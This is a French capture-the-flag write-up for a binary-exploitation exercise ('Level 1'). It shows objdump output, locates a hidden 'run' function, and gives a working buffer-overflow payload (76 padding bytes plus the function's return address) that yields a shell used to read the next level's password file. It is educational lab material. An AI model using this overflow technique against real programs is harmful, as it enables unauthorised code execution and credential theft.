## Level 1

On fait un `objdump -d  ~/level1`

On appercoit `main`, mais aussi `run`.
```
> objdump -d  ~/level1
[...]
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
[...]
08048480 <main>:
 8048480:	55                   	push   %ebp
 8048481:	89 e5                	mov    %esp,%ebp
 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
```

L'addresse de run en hexa est `08048444`
En little-endian, l'addresse est `\x44\x84\x04\x08`.

Dans le code C, on se rend compte qu'il ne peut y avoir que 76 octet alloués. Il y a donc un **segault** à partir de `76` caractères.

On peut donc faire:
```
> python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/hack1
> cat /tmp/hack1 - |  ./level1
[...]
Good... Wait what?
cat /home/user/level2/.pass
[...]
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
``` 

Dans notre fichier `hack1`, on a donc 76 caractères A + l'adresse de run.

Ensuite, on a envoyé notre fichier sur l'entrée standard de `level1` et avec le flag `-` de `cat`. On peut entrer la commande nous permettant d'obtenir le flag.

